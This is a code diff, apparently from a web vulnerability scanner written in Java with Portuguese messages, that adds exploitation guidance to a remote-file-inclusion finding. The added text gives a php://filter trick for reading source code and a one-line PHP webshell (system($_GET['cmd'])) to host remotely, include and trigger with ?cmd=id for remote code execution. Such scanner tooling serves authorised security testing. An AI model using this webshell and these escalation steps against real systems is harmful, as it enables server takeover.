@@ -78,7 +78,14 @@ public class RfiCheck implements VulnCheck {
                                           "uma função de inclusão/leitura remota.",
                                 "Payload: " + PAYLOAD + " | Assinatura: " + p.pattern(),
                                 "Nunca passe entrada do usuário para funções de include/require/fopen com suporte a wrapper de URL. " +
-                                        "Desabilite allow_url_include e allow_url_fopen, e use allowlist fixa de arquivos permitidos."));
+                                        "Desabilite allow_url_include e allow_url_fopen, e use allowlist fixa de arquivos permitidos.",
+                                confirmaFuncaoVulneravel
+                                        ? "1) Mesmo com allow_url_include=Off, teste php://filter/convert.base64-encode/resource=index.php " +
+                                          "no mesmo parâmetro pra ler código-fonte (isso não depende de allow_url_include). 2) Reavalie se a " +
+                                          "config pode mudar em outro ambiente (staging, por exemplo)."
+                                        : "1) Hospede um arquivo 'shell.txt' com um webshell PHP simples (ex: <?php system($_GET['cmd']); ?>) " +
+                                          "em um servidor que você controla. 2) No Repeater, troque o payload pelo link real desse arquivo no " +
+                                          "parâmetro '" + param + "'. 3) Se incluído, acesse <url_alvo>?cmd=id pra confirmar execução remota de código completa."));
                         break;
                     }
                 }
